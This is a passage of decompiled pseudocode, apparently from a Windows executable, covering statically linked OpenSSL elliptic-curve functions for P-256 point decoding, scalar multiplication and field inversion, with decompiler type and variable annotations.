  int v13; // [esp+8h] [ebp-Ch]
  void **Block; // [esp+Ch] [ebp-8h]
  int v15; // [esp+10h] [ebp-4h]
  int *v16; // [esp+24h] [ebp+10h]

  Block = 0;
  v15 = 0;
  if ( !a5 )
  {
    sub_408310(16, 103, 100, (int)"crypto\\ec\\ecp_oct.c", 285);
    return 0;
  }
  v7 = *a4 & 0xFE;
  v13 = *a4 & 1;
  switch ( v7 )
  {
    case 0:
      goto LABEL_9;
    case 2:
      break;
    case 4:
LABEL_9:
      if ( (*a4 & 1) != 0 )
      {
        sub_408310(16, 103, 102, (int)"crypto\\ec\\ecp_oct.c", 298);
        return 0;
      }
      break;
    case 6:
      break;
    default:
      sub_408310(16, 103, 102, (int)"crypto\\ec\\ecp_oct.c", 294);
      return 0;
  }
  if ( v7 )
  {
    v8 = (sub_416F90(a2[9]) + 7) / 8;
    v9 = v8 + 1;
    if ( v7 != 2 )
      v9 = 2 * v8 + 1;
    if ( a5 != v9 )
    {
      sub_408310(16, 103, 102, (int)"crypto\\ec\\ecp_oct.c", 317);
      return 0;
    }
    v10 = a6;
    if ( !a6 )
    {
      Block = (void **)sub_420670();
      v10 = (int *)Block;
      if ( !Block )
        return 0;
    }
    sub_420700(v10);
    v16 = sub_420790(v10);
    v11 = sub_420790(v10);
    if ( v11 && sub_4174D0(a4 + 1, v8, (int)v16) )
    {
      if ( sub_416960(v16, a2[9]) >= 0 )
      {
        sub_408310(16, 103, 102, (int)"crypto\\ec\\ecp_oct.c", 336);
        goto LABEL_39;
      }
      if ( v7 == 2 )
      {
        v12 = sub_436F50(a1, a2, a3, v16, v13, v10);
        goto LABEL_37;
      }
      if ( sub_4174D0(&a4[v8 + 1], v8, (int)v11) )
      {
        if ( sub_416960(v11, a2[9]) < 0 )
        {
          if ( v7 != 6 || v13 == sub_416E20((int)v11) )
          {
            v12 = sub_436DF0((int)a2, a3, (int)v16, (int)v11, (int)v10);
LABEL_37:
            if ( v12 )
              v15 = 1;
            goto LABEL_39;
          }
          sub_408310(16, 103, 102, (int)"crypto\\ec\\ecp_oct.c", 353);
        }
        else
        {
          sub_408310(16, 103, 102, (int)"crypto\\ec\\ecp_oct.c", 348);
        }
      }
    }
LABEL_39:
    sub_420750(v10);
    sub_4206C0(Block);
    return v15;
  }
  if ( a5 != 1 )
  {
    sub_408310(16, 103, 102, (int)"crypto\\ec\\ecp_oct.c", 304);
    return 0;
  }
  return sub_436120((int)a2, a3);
}
// 4594AD: conditional instruction was optimized away because esi.4 is in (==2|==6)

//----- (00459690) --------------------------------------------------------
int *__fastcall sub_459690(_DWORD *a1, int a2, int *a3)
{
  int *result; // eax
  int v4; // edx
  int v5; // ebx
  int v6; // edi
  int v7; // ebx
  int v8; // edi
  int v9; // ebx
  int v10; // ebx
  int v11; // edi
  int v12; // ebx

  result = a3;
  v4 = -a2;
  v5 = a3[1];
  *a3 = v4 & *a1 ^ ~v4 & *a3;
  v6 = ~v4 & v5 ^ v4 & a1[1];
  v7 = a3[2];
  a3[1] = v6;
  v8 = ~v4 & v7 ^ v4 & a1[2];
  v9 = a3[3];
  a3[2] = v8;
  a3[3] = ~v4 & v9 ^ v4 & a1[3];
  v10 = a3[5];
  a3[4] = a3[4] & ~v4 ^ v4 & a1[4];
  v11 = ~v4 & v10 ^ v4 & a1[5];
  v12 = a3[6];
  a3[5] = v11;
  a3[6] = ~v4 & v12 ^ v4 & a1[6];
  a3[7] = ~v4 & a3[7] ^ v4 & a1[7];
  return result;
}

//----- (00459720) --------------------------------------------------------
BOOL __usercall sub_459720@<eax>(_DWORD *a1@<edx>, _DWORD *a2)
{
  int v2; // ecx
  int v3; // esi

  v2 = a2[2] ^ a1[2] | a2[3] ^ a1[3] | a2[4] ^ a1[4] | a2[5] ^ a1[5] | a2[6] ^ a1[6] | a2[7] ^ a1[7];
  v3 = a2[1] ^ a1[1];
  return (*a2 ^ *a1 | v3 | v2 | -(*a2 ^ *a1 | v3 | v2)) >= 0;
}

//----- (00459770) --------------------------------------------------------
BOOL __usercall sub_459770@<eax>(int a1@<edi>)
{
  _DWORD *v1; // esi
  int v3; // [esp+0h] [ebp-Ch]

  v1 = (_DWORD *)sub_435D30(v3);
  return sub_422350(a1) == 7
      && ((v1[1] | v1[2] | *v1 ^ 1 | ~v1[3] | ~v1[4] | ~v1[5] | v1[6] ^ 0xFFFFFFFE | -(v1[1] | v1[2] | *v1 ^ 1 | ~v1[3] | ~v1[4] | ~v1[5] | v1[6] ^ 0xFFFFFFFE)) & 0x80000000) == 0;
}
// 459775: variable 'v3' is possibly undefined

//----- (004597D0) --------------------------------------------------------
unsigned int __cdecl sub_4597D0(unsigned int *a1)
{
  unsigned int *v1; // ecx
  unsigned int *v2; // edi
  int v3; // esi
  int v4; // esi
  int v5; // esi
  int v6; // esi
  int v7; // esi
  int v8; // esi
  int v9; // esi
  unsigned int result; // eax
  unsigned int v11[8]; // [esp+8h] [ebp-C0h] BYREF
  unsigned int v12[8]; // [esp+28h] [ebp-A0h] BYREF
  unsigned int v13[8]; // [esp+48h] [ebp-80h] BYREF
  unsigned int v14[8]; // [esp+68h] [ebp-60h] BYREF
  unsigned int v15[8]; // [esp+88h] [ebp-40h] BYREF
  unsigned int v16[8]; // [esp+A8h] [ebp-20h] BYREF

  v2 = v1;
  sub_4A9480(v11, v1);
  sub_4A9450(v16, v11, v2);
  sub_4A9480(v11, v16);
  sub_4A9480(v11, v11);
  sub_4A9450(v14, v11, v16);
  sub_4A9480(v11, v14);
  sub_4A9480(v11, v11);
  sub_4A9480(v11, v11);
  sub_4A9480(v11, v11);
  sub_4A9450(v13, v11, v14);
  sub_4A9480(v11, v13);
  v3 = 7;
  do
  {
    sub_4A9480(v11, v11);
    --v3;
  }
  while ( v3 );
  sub_4A9450(v12, v11, v13);
  sub_4A9480(v11, v12);
  v4 = 15;
  do
  {
    sub_4A9480(v11, v11);
    --v4;
  }
  while ( v4 );
  sub_4A9450(v15, v11, v12);
  sub_4A9480(v11, v15);
  v5 = 31;
  do
  {
    sub_4A9480(v11, v11);
    --v5;
  }
  while ( v5 );
  sub_4A9450(v11, v11, v2);
  v6 = 128;
  do
  {
    sub_4A9480(v11, v11);
    --v6;
  }
  while ( v6 );
  sub_4A9450(v11, v11, v15);
  v7 = 32;
  do
  {
    sub_4A9480(v11, v11);
    --v7;
  }
  while ( v7 );
  sub_4A9450(v11, v11, v15);
  v8 = 16;
  do
  {
    sub_4A9480(v11, v11);
    --v8;
  }
  while ( v8 );
  sub_4A9450(v11, v11, v12);
  v9 = 8;
  do
  {
    sub_4A9480(v11, v11);
    --v9;
  }
  while ( v9 );
  sub_4A9450(v11, v11, v13);
  sub_4A9480(v11, v11);
  sub_4A9480(v11, v11);
  sub_4A9480(v11, v11);
  sub_4A9480(v11, v11);
  sub_4A9450(v11, v11, v14);
  sub_4A9480(v11, v11);
  sub_4A9480(v11, v11);
  sub_4A9450(v11, v11, v16);
  sub_4A9480(v11, v11);
  sub_4A9480(v11, v11);
  result = sub_4A9450(v11, v11, v2);
  qmemcpy(a1, v11, 0x20u);
  return result;
}
// 4597DC: variable 'v1' is possibly undefined
// 4597D0: using guessed type unsigned int var_C0[8];
// 4597D0: using guessed type unsigned int var_20[8];
// 4597D0: using guessed type unsigned int var_60[8];
// 4597D0: using guessed type unsigned int var_80[8];
// 4597D0: using guessed type unsigned int var_A0[8];
// 4597D0: using guessed type unsigned int var_40[8];

//----- (00459AD0) --------------------------------------------------------
int __cdecl sub_459AD0(int a1, unsigned int *a2, int a3, int a4, unsigned int a5, int *a6)
{
  int *v6; // eax
  int v7; // esi
  _DWORD *v8; // ebx
  int *v9; // ebp
  int v10; // edi
  _DWORD *v11; // eax
  int v12; // edi
  unsigned int v13; // edx
  unsigned int *v14; // ebp
  unsigned int v15; // edx
  int v16; // esi
  unsigned int v17; // eax
  char v18; // bp
  int v19; // edi
  unsigned int v20; // edx
  int v21; // eax
  unsigned int v22; // ebp
  unsigned __int8 *v24; // edi
  unsigned int v25; // edx
  unsigned int v26; // esi
  unsigned __int8 *v28; // [esp+10h] [ebp-30h]
  int v29; // [esp+14h] [ebp-2Ch]
  unsigned int v30; // [esp+14h] [ebp-2Ch]
  unsigned __int8 *v31; // [esp+18h] [ebp-28h]
  int *v32; // [esp+1Ch] [ebp-24h]
  void *Block; // [esp+24h] [ebp-1Ch]
  int *v34; // [esp+28h] [ebp-18h]
  int v35; // [esp+2Ch] [ebp-14h]
  unsigned int v36; // [esp+2Ch] [ebp-14h]
  unsigned int v37; // [esp+2Ch] [ebp-14h]
  int v38; // [esp+30h] [ebp-10h]
  int v39; // [esp+34h] [ebp-Ch]
  _DWORD *v40; // [esp+38h] [ebp-8h]
  int v41; // [esp+3Ch] [ebp-4h]
  int v42; // [esp+54h] [ebp+14h]

  v38 = 0;
  v28 = 0;
  v34 = 0;
  Block = 0;
  if ( 16 * a5 + 6 <= 0x1555555
    && (Block = sub_4133F0(1536 * a5 + 544)) != 0
    && (v28 = (unsigned __int8 *)sub_4133F0(33 * a5)) != 0
    && (v6 = (int *)sub_4133F0(4 * a5), (v34 = v6) != 0) )
  {
    v7 = (int)Block - ((unsigned __int8)Block & 0x3F) + 64;
    v8 = (_DWORD *)(v7 + 1536 * a5);
    v35 = 0;
    if ( a5 )
    {
      v29 = 0;
      v9 = v6;
      v10 = a3 - (_DWORD)v6;
      v32 = v6;
      v31 = v28 + 1;
      v39 = a3 - (_DWORD)v6;
      v41 = a4 - (_DWORD)v6;
      while ( 1 )
      {
        if ( sub_416F90(*(_DWORD **)((char *)v9 + v10)) > 256 || sub_416E40(*(int *)((char *)v9 + v10)) )
        {
          v11 = sub_420790(a6);
          v40 = v11;
          if ( !v11 )
            goto LABEL_36;
          if ( !sub_42A2D0(v11, *(_DWORD **)((char *)v9 + v10), *(int **)(a1 + 8), a6) )
          {
            sub_408310(16, 242, 3, (int)"crypto\\ec\\ecp_nistz256.c", 626);
            goto LABEL_36;
          }
          *v9 = (int)v40;
        }
        else
        {
          *v9 = *(int *)((char *)v9 + v10);
        }
        v12 = 0;
        if ( 4 * sub_422350(*v9) <= 0 )
          goto LABEL_17;
        do
        {
          *(_DWORD *)&v31[v12 - 1] = *(_DWORD *)(sub_435D30(*v9) + 4 * (v12 / 4));
          v12 += 4;
        }
        while ( v12 < 4 * sub_422350(*v9) );
        if ( v12 < 33 )
LABEL_17:
          memset(&v28[v29 + v12], 0, 33 - v12);
        if ( !sub_422380(v8, *(_DWORD *)(*(int *)((char *)v9 + v41) + 4), 8)
          || !sub_422380(v8 + 8, *(_DWORD *)(*(int *)((char *)v9 + v41) + 8), 8)
          || !sub_422380(v8 + 16, *(_DWORD *)(*(int *)((char *)v9 + v41) + 12), 8) )
        {
          break;
        }
        sub_4AA080(v7, v8, 1);
        sub_4AA560((int)(v8 + 24), v8);
        sub_4AA080(v7, v8 + 24, 2);
        sub_4AA760(v8 + 48, v8 + 24, v8);
        sub_4AA080(v7, v8 + 48, 3);
        sub_4AA560((int)(v8 + 24), v8 + 24);
        sub_4AA080(v7, v8 + 24, 4);
        sub_4AA560((int)(v8 + 48), v8 + 48);
        sub_4AA080(v7, v8 + 48, 6);
        sub_4AA760(v8 + 72, v8 + 24, v8);
        sub_4AA080(v7, v8 + 72, 5);
        sub_4AA760(v8 + 96, v8 + 48, v8);
        sub_4AA080(v7, v8 + 96, 7);
        sub_4AA560((int)(v8 + 24), v8 + 24);
        sub_4AA080(v7, v8 + 24, 8);
        sub_4AA560((int)(v8 + 48), v8 + 48);
        sub_4AA080(v7, v8 + 48, 12);
        sub_4AA560((int)(v8 + 72), v8 + 72);
        sub_4AA080(v7, v8 + 72, 10);
        sub_4AA560((int)(v8 + 96), v8 + 96);
        sub_4AA080(v7, v8 + 96, 14);
        sub_4AA760(v8 + 48, v8 + 48, v8);
        sub_4AA080(v7, v8 + 48, 13);
        sub_4AA760(v8 + 72, v8 + 72, v8);
        sub_4AA080(v7, v8 + 72, 11);
        sub_4AA760(v8 + 96, v8 + 96, v8);
        sub_4AA080(v7, v8 + 96, 15);
        sub_4AA760(v8 + 48, v8 + 24, v8);
        sub_4AA080(v7, v8 + 48, 9);
        sub_4AA560((int)(v8 + 24), v8 + 24);
        sub_4AA080(v7, v8 + 24, 16);
        ++v32;
        v29 += 33;
        v31 += 33;
        v7 += 1536;
        if ( ++v35 >= a5 )
        {
          v7 = (int)Block - ((unsigned __int8)Block & 0x3F) + 64;
          goto LABEL_23;
        }
        v9 = v32;
        v10 = v39;
      }
      sub_408310(16, 242, 146, (int)"crypto\\ec\\ecp_nistz256.c", 655);
    }
    else
    {
LABEL_23:
      v13 = (v28[31] >> 6) & 0x3F;
      v30 = 255;
      sub_4AA0D0(
        v8,
        v7,
        (((v13 & ((v13 >> 5) - 1) | ~((v13 >> 5) - 1) & (63 - v13)) & 1)
       + ((v13 & ((v13 >> 5) - 1) | ~((v13 >> 5) - 1) & (63 - v13)) >> 1)) & 0x7FFFFFFF);
      v14 = a2;
      qmemcpy(a2, v8, 0x60u);
      do
      {
        v15 = v30 == 255;
        if ( v15 < a5 )
        {
          v16 = (int)Block + 1536 * v15 - ((unsigned __int8)Block & 0x3F) + 64;
          v17 = (v30 - 1) >> 3;
          v18 = (v30 - 1) & 7;
          v19 = 33 * v15;
          v36 = a5 - v15;
          while ( 1 )
          {
            v20 = (*(unsigned __int16 *)&v28[v19 + v17] >> v18) & 0x3F;
            v21 = ~((v20 >> 5) - 1);
            v22 = (v21 & 1)
                + 2
                * (((v20 & (unsigned __int8)~(_BYTE)v21 | (unsigned __int8)(v21 & (63 - v20))) & 1)
                 + ((v20 & ~v21 | v21 & (63 - v20)) >> 1));
            sub_4AA0D0(v8, v16, v22 >> 1);
            sub_4A93A0(v8 + 32, (int)(v8 + 8));
            sub_459690(v8 + 32, v22 & 1, v8 + 8);
            v14 = a2;
            sub_4AA760(a2, a2, v8);
            v19 += 33;
            v16 += 1536;
            if ( !--v36 )
              break;
            v18 = (v30 - 1) & 7;
            v17 = (v30 - 1) >> 3;
          }
        }
        v30 -= 5;
        sub_4AA560((int)v14, v14);
        sub_4AA560((int)v14, v14);
        sub_4AA560((int)v14, v14);
        sub_4AA560((int)v14, v14);
        sub_4AA560((int)v14, v14);
      }
      while ( v30 >= 5 );
      if ( a5 )
      {
        v24 = v28;
        v42 = (int)Block - ((unsigned __int8)Block & 0x3F) + 64;
        v37 = a5;
        do
        {
          v25 = (2 * (*v24 & 0x1F)) & (((2 * (*v24 & 0x1Fu)) >> 5) - 1) | ~(((2 * (*v24 & 0x1Fu)) >> 5) - 1) & (63 - 2 * (*v24 & 0x1F));
          v26 = (((((2 * (*v24 & 0x1Fu)) >> 5) - 1) & 1) == 0) + 2 * ((v25 & 1) + (v25 >> 1));
          sub_4AA0D0(v8, v42, v26 >> 1);
          sub_4A93A0(v8 + 32, (int)(v8 + 8));
          sub_459690(v8 + 32, v26 & 1, v8 + 8);
          sub_4AA760(v14, v14, v8);
          v42 += 1536;
          v24 += 33;
          --v37;
        }
        while ( v37 );
      }
      v38 = 1;
    }
  }
  else
  {
    sub_408310(16, 242, 65, (int)"crypto\\ec\\ecp_nistz256.c", 609);
  }
LABEL_36:
  sub_413490(Block);
  sub_413490(v28);
  sub_413490(v34);
  return v38;
}

//----- (0045A170) --------------------------------------------------------
BOOL __usercall sub_45A170@<eax>(int *a1@<esi>)
{
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  BOOL result; // eax

  result = 0;
  if ( sub_422350(a1[1]) == 8 && sub_422350(a1[2]) == 8 )
  {
    v1 = (_DWORD *)sub_435D30(a1[1]);
    if ( sub_459720(v1, dword_50F430) )
    {
      v2 = (_DWORD *)sub_435D30(a1[2]);
      if ( sub_459720(v2, dword_50F450) )
      {
        if ( sub_459770(a1[3]) )
          return 1;
      }
    }
  }
  return result;
}
// 50F430: using guessed type _DWORD dword_50F430[8];
// 50F450: using guessed type _DWORD dword_50F450[8];

//----- (0045A1F0) --------------------------------------------------------
void **__cdecl sub_45A1F0(_DWORD *a1, int a2, int a3, int a4)
{
  void **result; // eax
  void **v5; // ebx
  void **v6; // ebp
  int v7; // esi
  char v8[32]; // [esp+4h] [ebp-40h] BYREF
  char v9[32]; // [esp+24h] [ebp-20h] BYREF

  result = (void **)sub_4168C0();
  v5 = result;
  if ( result )
  {
    v6 = (void **)sub_4168C0();
    if ( v6 )
    {
      qmemcpy(v8, (const void *)a3, sizeof(v8));
      sub_4223C0(v5, (int)v8, 8);
      qmemcpy(v9, (const void *)(a3 + 32), sizeof(v9));
      sub_4223C0(v6, (int)v9, 8);
      v7 = sub_436DF0(a2, a1, (int)v5, (int)v6, a4);
      sub_417060(v5);
      sub_417060(v6);
      return (void **)v7;
    }
    else
    {
      sub_417060(v5);
      return 0;
    }
  }
  return result;
}

//----- (0045A2A0) --------------------------------------------------------
int __cdecl sub_45A2A0(int a1, _DWORD *a2, _DWORD *a3, unsigned int a4, void *a5, void *a6, int *a7)
{
  int v7; // ebx
  unsigned int v8; // esi
  int v9; // edi
  int v11; // eax
  int *v12; // eax
  _DWORD *v13; // esi
  _DWORD *v14; // esi
  int v15; // esi
  int v16; // eax
  unsigned int v17; // edx
  unsigned int v18; // esi
  unsigned int v19; // esi
  unsigned int v20; // eax
  int v21; // ebx
  unsigned int v22; // edx
  int v23; // eax
  unsigned int v24; // edx
  unsigned int v25; // edi
  size_t v26; // edi
  char *v27; // esi
  char *v28; // ebx
  unsigned int *v29; // ebx
  int *v30; // [esp+24h] [ebp-13Ch]
  int v31; // [esp+28h] [ebp-138h]
  int v32; // [esp+28h] [ebp-138h]
  int v33; // [esp+2Ch] [ebp-134h]
  void *v34; // [esp+30h] [ebp-130h]
  int *v35; // [esp+34h] [ebp-12Ch]
  int *v36; // [esp+38h] [ebp-128h]
  void *Src; // [esp+3Ch] [ebp-124h]
  void *Block; // [esp+48h] [ebp-118h]
  void *v39; // [esp+4Ch] [ebp-114h]
  void **v40; // [esp+50h] [ebp-110h]
  int v41; // [esp+54h] [ebp-10Ch]
  unsigned int v42[8]; // [esp+60h] [ebp-100h] BYREF
  int v43[8]; // [esp+80h] [ebp-E0h] BYREF
  int v44[3]; // [esp+A0h] [ebp-C0h] BYREF
  int v45; // [esp+ACh] [ebp-B4h]
  int v46; // [esp+B0h] [ebp-B0h]
  int v47; // [esp+B4h] [ebp-ACh]
  unsigned int v48; // [esp+B8h] [ebp-A8h]
  int v49; // [esp+BCh] [ebp-A4h]
  unsigned int v50[8]; // [esp+C0h] [ebp-A0h] BYREF
  int v51[8]; // [esp+E0h] [ebp-80h] BYREF
  _DWORD v52[14]; // [esp+100h] [ebp-60h] BYREF
  char v53; // [esp+138h] [ebp-28h] BYREF
  int v54[8]; // [esp+139h] [ebp-27h] BYREF

  v34 = a5;
  v7 = (int)a3;
  v30 = a7;
  v8 = a4;
  Src = a6;
  memset(v54, 0, sizeof(v54));
  v9 = a1;
  v41 = 0;
  v33 = 0;
  v53 = 0;
  v35 = 0;
  v40 = 0;
  v39 = 0;
  Block = 0;
  if ( a4 == -1 || a4 + 1 > 0x1FFFFFFF )
  {
    sub_408310(16, 241, 65, (int)"crypto\\ec\\ecp_nistz256.c", 1167);
    return 0;
  }
  if ( *(_DWORD *)a1 == *a2 )
  {
    if ( !a3 && !a4 )
      return sub_436120(a1, a2);
    v11 = 0;
    if ( a4 )
    {
      while ( *(_DWORD *)a1 == **((_DWORD **)a5 + v11) )
      {
        if ( ++v11 >= a4 )
          goto LABEL_11;
      }
      sub_408310(16, 241, 101, (int)"crypto\\ec\\ecp_nistz256.c", 1181);
      return 0;
    }
LABEL_11:
    if ( !a7 )
    {
      v40 = (void **)sub_420670();
      v30 = (int *)v40;
      if ( !v40 )
      {
LABEL_60:
        sub_4206C0(v40);
        sub_413490(Block);
        sub_413490(v39);
        return v41;
      }
    }
    sub_420700(v30);
    if ( !a3 )
    {
      v33 = 1;
LABEL_48:
      if ( v8 )
      {
        v29 = v50;
        if ( v33 )
          v29 = v42;
        if ( !sub_459AD0(v9, v29, (int)Src, (int)v34, v8, v30) )
          goto LABEL_58;
        if ( !v33 )
          sub_4AA760(v42, v42, v29);
      }
      if ( sub_4223F0(a2[1], v42, 8) && sub_4223F0(a2[2], v43, 8) && sub_4223F0(a2[3], v44, 8) )
      {
        a2[4] = sub_459770(a2[3]);
        v41 = 1;
      }
LABEL_58:
      if ( v30 )
        sub_420750(v30);
      goto LABEL_60;
    }
    v12 = (int *)sub_422350(a1);
    v36 = v12;
    if ( !v12 )
    {
      sub_408310(16, 241, 113, (int)"crypto\\ec\\ecp_nistz256.c", 1197);
      goto LABEL_58;
    }
    v31 = *(_DWORD *)(a1 + 96);
    if ( v31 )
    {
      v13 = sub_435F90((int *)a1);
      if ( !v13 )
        goto LABEL_58;
      if ( !sub_45A1F0(v13, a1, *(_DWORD *)(v31 + 8), (int)v30) )
      {
        sub_436040(v13);
        goto LABEL_58;
      }
      if ( !sub_4364F0(a1, v36, v13, (int)v30) )
        v35 = *(int **)(v31 + 8);
      sub_436040(v13);
      if ( v35 )
        goto LABEL_27;
      v12 = v36;
    }
    if ( !sub_45A170(v12) )
    {
      v26 = 4 * a4;
      v33 = 1;
      v27 = (char *)sub_4133F0(4 * a4 + 4);
      v39 = v27;
      if ( !v27 )
      {
        sub_408310(16, 241, 65, (int)"crypto\\ec\\ecp_nistz256.c", 1344);
        goto LABEL_58;
      }
      v28 = (char *)sub_4133F0(4 * a4 + 4);
      Block = v28;
      if ( !v28 )
      {
        sub_408310(16, 241, 65, (int)"crypto\\ec\\ecp_nistz256.c", 1350);
        goto LABEL_58;
      }
      memcpy(v27, a6, v26);
      *(_DWORD *)&v27[v26] = a3;
      memcpy(v28, a5, v26);
      Src = v27;
      *(_DWORD *)&v28[v26] = v36;
      v34 = v28;
      v8 = a4 + 1;
      goto LABEL_47;
    }
    v35 = dword_484000;
LABEL_27:
    if ( sub_416F90(a3) > 256 || sub_416E40((int)a3) )
    {
      v14 = sub_420790(v30);
      if ( !v14 )
        goto LABEL_58;
      if ( !sub_42A2D0(v14, a3, *(int **)(a1 + 8), v30) )
      {
        sub_408310(16, 241, 3, (int)"crypto\\ec\\ecp_nistz256.c", 1243);
        goto LABEL_58;
      }
      v7 = (int)v14;
    }
    v15 = 0;
    if ( 4 * sub_422350(v7) <= 0 )
      goto LABEL_36;
    do
    {
      v16 = *(_DWORD *)(sub_435D30(v7) + 4 * (v15 / 4));
      *(&v53 + v15) = v16;
      LOBYTE(v54[v15 / 4u]) = BYTE1(v16);
      BYTE1(v54[v15 / 4u]) = BYTE2(v16);
      BYTE2(v54[v15 / 4u]) = HIBYTE(v16);
      v15 += 4;
    }
    while ( v15 < 4 * sub_422350(v7) );
    if ( v15 < 33 )
LABEL_36:
      memset(&v53 + v15, 0, 33 - v15);
    v17 = (2 * (v53 & 0x7F)) & (((2 * (v53 & 0x7Fu)) >> 7) - 1) | ~(((2 * (v53 & 0x7Fu)) >> 7) - 1) & (255 - 2 * (v53 & 0x7F));
    v18 = (((((2 * (v53 & 0x7Fu)) >> 7) - 1) & 1) == 0) + 2 * ((v17 & 1) + (v17 >> 1));
    sub_4AA240(v42, (int)v35, v18 >> 1);
    sub_4A93A0(v44, (int)v43);
    sub_459690(v44, v18 & 1, v43);
    v44[1] = 0;
    v44[2] = 0;
    v49 = 0;
    v19 = 6;
    v32 = 36;
    v20 = v42[0] | v42[1] | v42[2] | v42[3] | v43[0] | v43[1] | v43[2] | v43[3] | v42[4] | v42[5] | v42[6] | v42[7] | v43[4] | v43[5] | v43[6] | v43[7];
    v45 = (((v20 | -v20) & 0x80000000) == 0) - 1;
    v46 = v45;
    v47 = v45;
    v44[0] = ((v20 | -v20) & 0x80000000) != 0;
    v48 = v45 & 0xFFFFFFFE;
    v21 = (int)(v35 + 1024);
    do
    {
      v22 = (unsigned int)((unsigned __int8)*(&v53 + (v19 >> 3)) | (*((unsigned __int8 *)v54 + (v19 >> 3)) << 8)) >> (v19 & 7);
      v19 += 7;
      v22 = (unsigned __int8)v22;
      v23 = ~(((unsigned __int8)v22 >> 7) - 1);
      v24 = v22 & ((v22 >> 7) - 1) | v23 & (255 - v22);
      v25 = (v23 & 1) + 2 * ((v24 & 1) + (v24 >> 1));
      sub_4AA240(v50, v21, v25 >> 1);
      sub_4A93A0(v52, (int)v51);
      sub_459690(v52, v25 & 1, v51);
      sub_4AAF20(v42, v42, v50);
      v21 += 4096;
      --v32;
    }
    while ( v32 );
    v8 = a4;
LABEL_47:
    v9 = a1;
    goto LABEL_48;
  }
  sub_408310(16, 241, 101, (int)"crypto\\ec\\ecp_nistz256.c", 1172);
  return 0;
}
// 484000: using guessed type int dword_484000[512];
// 45A2A0: using guessed type unsigned int var_A0[8];
// 45A2A0: using guessed type int var_80[8];
// 45A2A0: using guessed type _DWORD var_60[14];

//----- (0045A9B0) --------------------------------------------------------
int __cdecl sub_45A9B0(int a1, _DWORD *a2, int a3, int a4)
{
  unsigned int v5[8]; // [esp+4h] [ebp-120h] BYREF
  unsigned int v6[8]; // [esp+24h] [ebp-100h] BYREF
  unsigned int v7[8]; // [esp+44h] [ebp-E0h] BYREF
  _DWORD Src[8]; // [esp+64h] [ebp-C0h] BYREF
  unsigned int v9[8]; // [esp+84h] [ebp-A0h] BYREF
  char v10[32]; // [esp+A4h] [ebp-80h] BYREF
  unsigned int v11[8]; // [esp+C4h] [ebp-60h] BYREF
  unsigned int v12[8]; // [esp+E4h] [ebp-40h] BYREF
  _DWORD v13[8]; // [esp+104h] [ebp-20h] BYREF

  if ( sub_436430(a1, a2) )
  {
    sub_408310(16, 240, 106, (int)"crypto\\ec\\ecp_nistz256.c", 1407);
  }
  else if ( sub_422380(v12, a2[1], 8) && sub_422380(v9, a2[2], 8) && sub_422380(v10, a2[3], 8) )
  {
    sub_4597D0(v5);
    sub_4A9480(v6, v5);
    sub_4A9450(v7, v6, v12);
    if ( !a3 || (sub_4A9420(Src, v7), sub_4223F0(a3, Src, 8)) )
    {
      if ( !a4 )
        return 1;
      sub_4A9450(v5, v5, v6);
      sub_4A9450(v11, v5, v9);
      sub_4A9420(v13, v11);
      if ( sub_4223F0(a4, v13, 8) )
        return 1;
    }
  }
  else
  {
    sub_408310(16, 240, 146, (int)"crypto\\ec\\ecp_nistz256.c", 1414);
  }
  return 0;
}
// 45A9B0: using guessed type unsigned int var_40[8];
// 45A9B0: using guessed type unsigned int var_A0[8];
// 45A9B0: using guessed type char var_80[32];
// 45A9B0: using guessed type unsigned int var_120[8];
// 45A9B0: using guessed type unsigned int var_100[8];
// 45A9B0: using guessed type unsigned int var_E0[8];
// 45A9B0: using guessed type _DWORD Src[8];
// 45A9B0: using guessed type unsigned int var_60[8];
// 45A9B0: using guessed type _DWORD var_20[8];

//----- (0045AB50) --------------------------------------------------------
_DWORD *__usercall sub_45AB50@<eax>(int a1@<edi>)
{
  _DWORD *v2; // eax
  _DWORD *v3; // esi
  struct _RTL_CRITICAL_SECTION *v4; // eax

  if ( !a1 )
    return 0;
  v2 = sub_413430(0x18u);
  v3 = v2;
  if ( v2 )
  {
    *v2 = a1;
    v2[1] = 6;
    v2[4] = 1;
    v4 = sub_414650();
    v3[5] = v4;
    if ( v4 )
    {
      return v3;
    }
    else
    {
      sub_408310(16, 244, 65, (int)"crypto\\ec\\ecp_nistz256.c", 1459);
      sub_413490(v3);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 244, 65, (int)"crypto\\ec\\ecp_nistz256.c", 1449);
    return 0;
  }
}

//----- (0045ABE0) --------------------------------------------------------
void __cdecl sub_45ABE0(volatile LONG *Block)
{
  volatile LONG *v1; // esi

  v1 = Block;
  if ( Block )
  {
    sub_4147E0(Block + 4, -1, &Block);
    if ( (int)Block <= 0 )
    {
      sub_413490(*((void **)v1 + 3));
      sub_4146D0(*((LPCRITICAL_SECTION *)v1 + 5));
      sub_413490((void *)v1);
    }
  }
}

//----- (0045AC40) --------------------------------------------------------
BOOL __cdecl sub_45AC40(int a1)
{
  int *v1; // eax

  v1 = (int *)sub_422350(a1);
  return v1 && sub_45A170(v1) || *(_DWORD *)(a1 + 92) == 4 && *(_DWORD *)(a1 + 96);
}

//----- (0045AC80) --------------------------------------------------------
int __cdecl sub_45AC80(int *a1, int *a2)
{
  _DWORD *v2; // ebx
  int *v3; // esi
  int v5; // eax
  void *v6; // eax
  int v7; // ebp
  _DWORD *v8; // eax
  int v9; // esi
  _DWORD *v10; // [esp+Ch] [ebp-64h]
  void *Block; // [esp+10h] [ebp-60h]
  int v12; // [esp+14h] [ebp-5Ch]
  volatile LONG *v13; // [esp+18h] [ebp-58h]
  int v14; // [esp+1Ch] [ebp-54h]
  int v15; // [esp+20h] [ebp-50h]
  void **v16; // [esp+24h] [ebp-4Ch]
  int v17; // [esp+28h] [ebp-48h]
  int *v18; // [esp+2Ch] [ebp-44h]
  unsigned int v19[8]; // [esp+30h] [ebp-40h] BYREF
  char v20[32]; // [esp+50h] [ebp-20h] BYREF

  v2 = 0;
  v10 = 0;
  v16 = 0;
  v17 = 0;
  Block = 0;
  sub_435D10((int)a1);
  v3 = (int *)sub_422350((int)a1);
  v18 = v3;
  if ( !v3 )
  {
    sub_408310(16, 243, 113, (int)"crypto\\ec\\ecp_nistz256.c", 806);
    return 0;
  }
  if ( sub_45A170(v3) )
    return 1;
  v13 = sub_45AB50((int)a1);
  if ( !v13 )
    return 0;
  if ( a2 || (v16 = (void **)sub_420670(), (a2 = (int *)v16) != 0) )
  {
    sub_420700(a2);
    v5 = sub_432B60((int)a1);
    if ( v5 )
    {
      if ( sub_416DB0(v5) )
      {
